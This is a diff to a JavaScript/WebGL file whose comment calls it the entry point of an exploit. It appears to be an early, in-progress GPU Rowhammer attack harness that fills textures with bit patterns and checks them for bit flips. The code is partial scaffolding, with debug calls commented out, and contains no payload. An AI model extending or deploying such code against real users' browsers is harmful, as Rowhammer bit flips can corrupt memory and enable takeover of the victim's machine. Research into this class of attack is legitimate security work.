@@ -1,8 +1,3 @@
-const KB = 1024;
-const KB4 = KB * 4;
-const PAGE_TEXTURE_W = 32;
-const PAGE_TEXTURE_H = 32;
-
 /**
 * Entry point of the exploit
 */
@@ -17,19 +12,25 @@ function glitch() {
 
 
     // create debug requirements
-    initDebug();
+    // initDebug();
     prepareHammerTime();
     gl.drawArrays(gl.TRIANGLES, 0, 6);
-    viewFramebuffer();
+    // viewFramebuffer();
 }
 
 function prepareHammerTime() {
     // TODO: this is only for testing purposes
     const textures = [];
     for(let i=0; i<9; i++) {
-        const t = createTexture2DRGBA(createUint8Array(KB4, i), PAGE_TEXTURE_W, PAGE_TEXTURE_H);
+        const t = createTexture2DRGBA(createUint8Array(KB4, 20+i), PAGE_TEXTURE_W, PAGE_TEXTURE_H);
         textures.push(t);
     }
+
+
+    fillTexture(textures[0], 0x00);
+    fillTexture(textures[1], 0xFF);
+    fillTexture(textures[2], 0x0F);
+    
     shader.bindTexture(textures[8], 8, 'H', 8);
     shader.bindTexture(textures[5], 5, 'H', 5);
     shader.bindTexture(textures[0], 0, 'H', 0);
@@ -39,15 +40,9 @@ function prepareHammerTime() {
     shader.bindTexture(textures[6], 6, 'H', 6);
     shader.bindTexture(textures[3], 3, 'H', 3);
     shader.bindTexture(textures[7], 7, 'H', 7);
-
-    console.log(textures);
+    
+    checkForFlip(textures[2]);
+    checkForFlip(textures[1]);
+    checkForFlip(textures[8]);
 }
 
-function createUint8Array(elements, fill=0x00) {
-    const arr = new Uint8Array(elements);
-
-    for(let i=0; i<elements; i++) {
-        arr[i] = fill;
-    }
-    return arr;
-}
